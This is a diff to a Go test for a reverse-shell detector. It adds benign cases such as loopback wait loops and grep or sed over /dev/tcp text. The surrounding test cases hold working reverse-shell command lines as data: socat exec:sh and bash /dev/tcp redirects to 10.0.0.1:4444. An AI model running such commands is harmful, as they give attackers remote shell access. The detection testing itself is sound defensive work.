@@ -144,6 +144,17 @@ func TestDetectReverseShells(t *testing.T) {
 		{name: "rg for tcp: or exec:", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "tcp:|exec:" src/`}}, wantCount: 0},
 		{name: "renamed socat with IPv6 address", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp6:[2001:db8::1]:443 exec:sh`}}, wantCount: 1},
 		{name: "renamed socat listener", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp-listen:4444,reuseaddr exec:sh`}}, wantCount: 1},
+		// False positives found in review of #858 (CRITICAL kills the agent's
+		// container): wait-for-service loops probing loopback inside a subshell
+		// or command substitution, and /dev/tcp text in non-shell programs.
+		{name: "wait loop with subshell loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until (echo > /dev/tcp/localhost/5432) >/dev/null 2>&1; do sleep 1; done`}}, wantCount: 0},
+		{name: "while-not subshell loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c while ! (: </dev/tcp/127.0.0.1/6379); do sleep 1; done`}}, wantCount: 0},
+		{name: "command substitution loopback read", processes: []Process{{PID: 1, User: "1000", Command: `bash -c x=$(</dev/tcp/localhost/80)`}}, wantCount: 0},
+		{name: "nested bash -c with escaped quotes", processes: []Process{{PID: 1, User: "1000", Command: `bash -c bash -c "until (echo > \"/dev/tcp/localhost/5432\"); do sleep 1; done"`}}, wantCount: 0},
+		{name: "git commit message mentioning /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `git commit -m fix: detect /dev/tcp/host/port redirects`}}, wantCount: 0},
+		{name: "grep for a loopback /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn "/dev/tcp/127.0.0.1/" .`}}, wantCount: 0},
+		{name: "sed rewriting /dev/tcp text", processes: []Process{{PID: 1, User: "1000", Command: `sed -i s|/dev/tcp/$host/$port|x| script.sh`}}, wantCount: 0},
+		{name: "k8s manifest with exec and a tcp:// URL", processes: []Process{{PID: 1, User: "1000", Command: "bash -c cat > k.yaml <<EOF\n  exec:\n    command: [x]\n  value: \"tcp://docker:2375\"\nEOF"}}, wantCount: 0},
 		{name: "double-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`}}, wantCount: 1},
 		{name: "single-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>'/dev/tcp/10.0.0.1/4444'; sh <&3 >&3`}}, wantCount: 1},
 		{name: "/dev/tcp path in a variable", processes: []Process{{PID: 1, User: "1000", Command: `bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`}}, wantCount: 1},
